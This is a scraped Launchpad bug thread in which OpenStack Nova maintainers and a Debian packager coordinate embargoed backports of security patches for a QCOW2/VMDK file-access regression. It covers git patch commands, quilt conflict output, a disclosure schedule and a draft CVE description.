        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T07:38:24.306053+00:00" title="2024-07-09 07:38:24 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-07-09T07:39:11.747806+00:00" title="2024-07-09 07:39:11 UTC">on 2024-07-09</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>the iso patch merged just as i was signing off last night.<br />
the content of unforce-<wbr />format.<wbr />patch is correct but it has a merge conflict<br />
i will be uploading my local version shortly to replace the existing one.</p>
<p>my plan for today is to backport the iso patch to all relevelnt release<br />
once that is done ill also upload backported variants of unforce-<wbr />format.<wbr />patch for each release<br />
as an attachment that applies on top of the relevant backport of the iso patch.</p>
<p>my goal for today is to have a public backport of the iso patches up for review and private attachment of the relevant patches here for this issue. that will likely take a few hours but<br />
ill provide the master version after grabbing a coffee so that you can start testing while I&#x27;m working to prepare the other patches.</p>
<p>regards<br />
sean</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">the iso patch merged just as i was signing off last night.
the content of unforce-format.patch is correct but it has a merge conflict
i will be uploading my local version shortly to replace the existing one.

my plan for today is to backport the iso patch to all relevelnt release
once that is done ill also upload backported variants of unforce-format.patch for each release
as an attachment that applies on top of the relevant backport of the iso patch.

my goal for today is to have a public backport of the iso patches up for review and private attachment of the relevant patches here for this issue. that will likely take a few hours but
ill provide the master version after grabbing a coffee so that you can start testing while I'm working to prepare the other patches.

regards
sean</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T09:24:05.231660+00:00" title="2024-07-09 09:24:05 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>i have uploaded a master.patch which is the same as unforce-<wbr />format.<wbr />patch rebased to master as of 2024-07-09 10:00 UTC</p>
<p>once I have the proposed backports for the iso patches I will create a &lt;branchname&gt;.patch file for each based on the relevant Gerrit commit.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">i have uploaded a master.patch which is the same as unforce-format.patch rebased to master as of 2024-07-09 10:00 UTC

once I have the proposed backports for the iso patches I will create a &lt;branchname&gt;.patch file for each based on the relevant Gerrit commit.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T11:42:49.792416+00:00" title="2024-07-09 11:42:49 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>i have now proposed the backport for the iso format fix to all stable branches</p>
<p><a rel="nofollow" href="https://review.opendev.org/q/topic:%22format-inspector%22">https:/<wbr />/review.<wbr />opendev.<wbr />org/q/topic:<wbr />%22format-<wbr />inspector%<wbr />22</a></p>
<p>the master.patch applies cleanly to 2024.1 <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923724">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923724</a><br />
it has conflict on 2023.2 <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923729">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923729</a><br />
and will also have conflicts on 2023.1 <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923733">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923733</a></p>
<p>i will prepare the relevnet addition patch files after i have resolved the conflicts locally and upload them</p>
<p>i will also upload a 2024.1 copy of the master patch even though they are identical just to have  a 1:1 mapping between patch and branch.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">i have now proposed the backport for the iso format fix to all stable branches

https://review.opendev.org/q/topic:%22format-inspector%22

the master.patch applies cleanly to 2024.1 https://review.opendev.org/c/openstack/nova/+/923724
it has conflict on 2023.2 https://review.opendev.org/c/openstack/nova/+/923729
and will also have conflicts on 2023.1 https://review.opendev.org/c/openstack/nova/+/923733

i will prepare the relevnet addition patch files after i have resolved the conflicts locally and upload them

i will also upload a 2024.1 copy of the master patch even though they are identical just to have  a 1:1 mapping between patch and branch.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T12:12:49.349495+00:00" title="2024-07-09 12:12:49 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>actully applying  patchs with &quot;git am -3 &lt; patch_file&quot; works cleanly.</p>
<p>i have preperared the branch specific version in any case and will start uploading them now</p>
<p>i belive -3 is needed because the parent commit sha is changing between branch and git needs the extra context of the 3 way merge to resolve the applcaition.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">actully applying  patchs with "git am -3 &lt; patch_file" works cleanly.

i have preperared the branch specific version in any case and will start uploading them now

i belive -3 is needed because the parent commit sha is changing between branch and git needs the extra context of the 3 way merge to resolve the applcaition.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T12:15:55.188133+00:00" title="2024-07-09 12:15:55 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>created by applying the master patch to <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923724">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923724</a><br />
with `git am &lt; ~/cve-patches/<wbr />master.<wbr />patch`</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">created by applying the master patch to https://review.opendev.org/c/openstack/nova/+/923724
with `git am &lt; ~/cve-patches/master.patch`</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T12:17:44.362300+00:00" title="2024-07-09 12:17:44 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>created by applying the 2024.1 patch to <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923729">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923729</a><br />
with `git am &lt; ~/cve-patches/<wbr />2024.1.<wbr />patch` and exporting with<br />
`git format-patch --from HEAD^1 --output ~/cve-patches/<wbr />2023.2.<wbr />patch`</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">created by applying the 2024.1 patch to https://review.opendev.org/c/openstack/nova/+/923729
with `git am &lt; ~/cve-patches/2024.1.patch` and exporting with 
`git format-patch --from HEAD^1 --output ~/cve-patches/2023.2.patch`</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T12:19:01.097820+00:00" title="2024-07-09 12:19:01 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>created by applying the 2023.2.patch to <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923733">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923733</a><br />
with `git am &lt; ~/cve-patches/<wbr />2023.2.<wbr />patch` and exporting with<br />
`git format-patch --from HEAD^1 --output ~/cve-patches/<wbr />2023.1.<wbr />patch`</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">created by applying the 2023.2.patch to https://review.opendev.org/c/openstack/nova/+/923733
with `git am &lt; ~/cve-patches/2023.2.patch` and exporting with 
`git format-patch --from HEAD^1 --output ~/cve-patches/2023.1.patch`</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T17:03:12.580994+00:00" title="2024-07-09 17:03:12 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thomas: We haven&#x27;t notified downstream stakeholders (security contacts for distributions and cloud providers) yet, but the plan is to supply them with tested patches a full week ahead of any public disclosure. If patches for maintained stable branches aren&#x27;t ready by Thursday, the earliest we can start that one-week clock is next Tuesday, 2024-07-16 (with a corresponding public disclosure a week later on 2024-07-23). Regardless, I plan to provide a week between supplying advance copies of the patches and the scheduled publication date.</p>
<p>Zack: Normally we don&#x27;t seek a separate CVE assignment to track regressions in security fixes when we intend to handle them as errata for a prior advisory. Since this is an extraordinary case though, I&#x27;ll submit a CVE assignment request tomorrow with the following details (everyone, please let me know if you spot inaccuracies, though they can also be adjusted later if needed):</p>
<p>Title: File access regression for QCOW2 backing files and VMDK flat descriptors<br />
Reporter: Arnaud Morin with OVH<br />
Products: Nova<br />
Affects: ==27.4.0, ==28.2.0, ==29.1.0</p>
<p>Description:<br />
Arnaud Morin (OVH) reported a vulnerability in Nova. By supplying a raw format image which is actually a specially created QCOW2 image with a backing file path or VMDK flat image with a descriptor file path, an authenticated user may convince systems to return a copy of that file’s contents from the server resulting in unauthorized access to potentially sensitive data. Only Nova deployments patched with the original OSSA-2024-001 fixes are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thomas: We haven't notified downstream stakeholders (security contacts for distributions and cloud providers) yet, but the plan is to supply them with tested patches a full week ahead of any public disclosure. If patches for maintained stable branches aren't ready by Thursday, the earliest we can start that one-week clock is next Tuesday, 2024-07-16 (with a corresponding public disclosure a week later on 2024-07-23). Regardless, I plan to provide a week between supplying advance copies of the patches and the scheduled publication date.

Zack: Normally we don't seek a separate CVE assignment to track regressions in security fixes when we intend to handle them as errata for a prior advisory. Since this is an extraordinary case though, I'll submit a CVE assignment request tomorrow with the following details (everyone, please let me know if you spot inaccuracies, though they can also be adjusted later if needed):

Title: File access regression for QCOW2 backing files and VMDK flat descriptors
Reporter: Arnaud Morin with OVH
Products: Nova
Affects: ==27.4.0, ==28.2.0, ==29.1.0

Description:
Arnaud Morin (OVH) reported a vulnerability in Nova. By supplying a raw format image which is actually a specially created QCOW2 image with a backing file path or VMDK flat image with a descriptor file path, an authenticated user may convince systems to return a copy of that file’s contents from the server resulting in unauthorized access to potentially sensitive data. Only Nova deployments patched with the original OSSA-2024-001 fixes are affected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~thomas-goirand" class="sprite person">Thomas Goirand (thomas-goirand)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T00:37:21.162516+00:00" title="2024-07-10 00:37:21 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi there!<br />
Sean, I tried applying your backport patch on top of Bobcat and Caracal, and each time, it doesn&#x27;t apply. I would resolve the conflicts by myself, if only this didn&#x27;t mean I&#x27;m probably missing a (critical?) patch:</p>
<p>$ quilt push<br />
Applying patch debian/<wbr />patches/<wbr />CVE-2024-<wbr />XXXXX_4_<wbr />Change-<wbr />force_format-<wbr />strategy-<wbr />to-catch-<wbr />mismatches_<wbr />caracal.<wbr />patch<br />
patching file nova/tests/<wbr />unit/virt/<wbr />libvirt/<wbr />test_utils.<wbr />py<br />
patching file nova/tests/<wbr />unit/virt/<wbr />test_images.<wbr />py<br />
Hunk #8 FAILED at 318.<br />
Hunk #9 succeeded at 342 (offset -18 lines).<br />
1 out of 9 hunks FAILED -- rejects in file nova/tests/<wbr />unit/virt/<wbr />test_images.<wbr />py<br />
patching file nova/virt/images.py<br />
Hunk #1 FAILED at 143.<br />
1 out of 2 hunks FAILED -- rejects in file nova/virt/images.py</p>
<p>Note that this is my current patch stack in debian/series:<br />
CVE-2024-<wbr />32498_1_<wbr />nova-stable-<wbr />2024.1_<wbr />Reject_<wbr />qcow_files_<wbr />with_data-<wbr />file_attributes<wbr />.patch<br />
CVE-2024-<wbr />32498_2_<wbr />nova-stable-<wbr />2024.1_<wbr />Check_images_<wbr />with_format_<wbr />inspector_<wbr />for_safety.<wbr />patch<br />
CVE-2024-<wbr />32498_3_<wbr />nova-stable-<wbr />2024.1_<wbr />Additional-<wbr />qemu-safety-<wbr />checking-<wbr />on-base-<wbr />images.<wbr />patch<br />
CVE-2024-<wbr />32498_4_<wbr />Fix-vmdk_<wbr />allowed_<wbr />types-checking.<wbr />patch<br />
CVE-2024-<wbr />XXXXX_1_<wbr />port_format_<wbr />inspector_<wbr />tests_from_<wbr />glance.<wbr />patch<br />
CVE-2024-<wbr />XXXXX_2_<wbr />Reproduce_<wbr />iso_regression_<wbr />with_deep_<wbr />format_<wbr />inspection.<wbr />patch<br />
CVE-2024-<wbr />XXXXX_3_<wbr />Add-iso-<wbr />file-format-<wbr />inspector.<wbr />patch<br />
CVE-2024-<wbr />XXXXX_4_<wbr />Change-<wbr />force_format-<wbr />strategy-<wbr />to-catch-<wbr />mismatches_<wbr />caracal.<wbr />patch</p>
<p>What patch am I missing?</p>
<p>Note I have the exact same issue in both Bobcat and Caracal (didn&#x27;t try Antelope yet, will soon go for it, and all the way to Victoria).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi there!
Sean, I tried applying your backport patch on top of Bobcat and Caracal, and each time, it doesn't apply. I would resolve the conflicts by myself, if only this didn't mean I'm probably missing a (critical?) patch:

$ quilt push
Applying patch debian/patches/CVE-2024-XXXXX_4_Change-force_format-strategy-to-catch-mismatches_caracal.patch
patching file nova/tests/unit/virt/libvirt/test_utils.py
patching file nova/tests/unit/virt/test_images.py
Hunk #8 FAILED at 318.
Hunk #9 succeeded at 342 (offset -18 lines).
1 out of 9 hunks FAILED -- rejects in file nova/tests/unit/virt/test_images.py
patching file nova/virt/images.py
Hunk #1 FAILED at 143.
1 out of 2 hunks FAILED -- rejects in file nova/virt/images.py

Note that this is my current patch stack in debian/series:
CVE-2024-32498_1_nova-stable-2024.1_Reject_qcow_files_with_data-file_attributes.patch
CVE-2024-32498_2_nova-stable-2024.1_Check_images_with_format_inspector_for_safety.patch
CVE-2024-32498_3_nova-stable-2024.1_Additional-qemu-safety-checking-on-base-images.patch
CVE-2024-32498_4_Fix-vmdk_allowed_types-checking.patch
CVE-2024-XXXXX_1_port_format_inspector_tests_from_glance.patch
CVE-2024-XXXXX_2_Reproduce_iso_regression_with_deep_format_inspection.patch
CVE-2024-XXXXX_3_Add-iso-file-format-inspector.patch
CVE-2024-XXXXX_4_Change-force_format-strategy-to-catch-mismatches_caracal.patch

What patch am I missing?

Note I have the exact same issue in both Bobcat and Caracal (didn't try Antelope yet, will soon go for it, and all the way to Victoria).
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~thomas-goirand" class="sprite person">Thomas Goirand (thomas-goirand)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T01:23:33.438758+00:00" title="2024-07-10 01:23:33 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I found out, it was *very* confusing. Looks like I had to update <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923289">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923289</a> to its latest version.</p>
<p>Please, please please please, when such patch is updated, you *must* let everyone know. Now, it feels like I&#x27;d have to check every single patch from CVE-2024-32498 just to make sure I have latest version... :/</p>
<p>Thomas</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I found out, it was *very* confusing. Looks like I had to update https://review.opendev.org/c/openstack/nova/+/923289 to its latest version.

Please, please please please, when such patch is updated, you *must* let everyone know. Now, it feels like I'd have to check every single patch from CVE-2024-32498 just to make sure I have latest version... :/

Thomas
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~thomas-goirand" class="sprite person">Thomas Goirand (thomas-goirand)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T01:40:16.533909+00:00" title="2024-07-10 01:40:16 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
